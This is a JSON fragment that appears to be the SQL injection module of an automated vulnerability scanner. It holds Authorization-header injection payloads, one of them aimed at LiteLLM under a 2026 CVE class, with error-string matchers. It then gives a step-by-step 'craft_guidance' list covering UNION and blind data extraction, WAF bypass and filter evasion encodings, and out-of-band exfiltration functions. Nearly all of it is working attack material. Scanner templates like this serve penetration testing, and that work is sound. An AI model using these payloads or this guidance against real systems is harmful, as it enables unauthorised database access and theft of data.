    "auth_header_injection": {
      "description": "SQLi via Authorization header. Many auth middleware concatenate Bearer-strip output into LIKE query without sanitisation.",
      "tech_match": [],
      "param_match": [],
      "probes": [
        {
          "payload": "Bearer AAAAAA'or'1'='1",
          "description": "Authorization: Bearer with single-quote escape \u2014 confirms via error reflection",
          "matchers": [
            {
              "type": "regex",
              "pattern": "(?i)(SQL syntax|ORA-\\d{5}|syntax error at or near|near \\\")"
            },
            {
              "type": "status",
              "status": [
                500,
                200
              ]
            }
          ],
          "severity": "critical",
          "confidence_boost": 75,
          "variables": {
            "header_inject": {
              "Authorization": "Bearer AAAAAA'or'1'='1"
            },
            "manual_chain": true
          }
        }
      ]
    },
    "litellm_pre_auth_header_injection_2026": {
      "description": "LiteLLM pre-auth SQLi via Authorization header (CVE-2026-42208 class) \u2014 Bearer token interpolated into unparameterised SELECT for API-key lookup. Detect via PostgreSQL error marker or OR-injection echo.",
      "tech_match": [
        "LiteLLM"
      ],
      "param_match": [],
      "probes": [
        {
          "payload": "Bearer ' OR (SELECT 1)=1--",
          "description": "Authorization header SQLi \u2014 boolean-OR with parenthesised subselect to bypass simple filters",
          "matchers": [
            {
              "type": "regex",
              "pattern": "(?i)(pg_query|SQLSTATE|psycopg2|MySQLSyntaxError|sqlite3\\.OperationalError)"
            },
            {
              "type": "status",
              "status": [
                200,
                500
              ]
            }
          ],
          "severity": "critical",
          "confidence_boost": 70,
          "variables": {
            "Authorization": "{{payload}}"
          }
        }
      ]
    }
  },
  "craft_guidance": [
    "1. IDENTIFY CONTEXT: Determine if input lands in WHERE clause, ORDER BY, INSERT VALUES, or LIMIT. Each needs different break characters.",
    "2. DETECT DB ENGINE: Use vendor-specific errors or functions \u2014 @@version (MSSQL), version() (MySQL/PG), sqlite_version() (SQLite), banner (Oracle).",
    "3. CHOOSE TECHNIQUE by visibility: Error-based (fastest) > UNION (data extraction) > Boolean blind (slow but reliable) > Time-based (last resort) > OOB DNS (when no output at all).",
    "4. UNION EXPLOITATION: Find column count with ORDER BY N (increment until error), then UNION SELECT NULL,NULL,...,NULL to match. Replace NULLs one-by-one with data extraction functions.",
    "5. BLIND EXTRACTION: Use SUBSTRING(value,pos,1) with binary search on ASCII values. For time-based, calibrate delay against baseline latency (+2s minimum delta).",
    "6. WAF BYPASS CHAIN: Try in order \u2014 inline comments (/*!50000 SELECT*/), case variation (sElEcT), whitespace alternatives (/**/ or %0a), double encoding (%2527), concat char-by-char (CHAR(83)+CHAR(69)...).",
    "7. FILTER EVASION: If quotes blocked, use hex (0x61646D696E), CHAR(), or numeric comparison. If spaces blocked, use /**/ or %09 (tab). If keywords blocked, use synonyms (COALESCE vs IF, CASE vs IIF).",
    "8. OOB EXFILTRATION: MySQL LOAD_FILE+INTO OUTFILE, MSSQL xp_dirtree/xp_fileexist to UNC path, PostgreSQL COPY TO PROGRAM, Oracle UTL_HTTP.REQUEST."
  ]
}
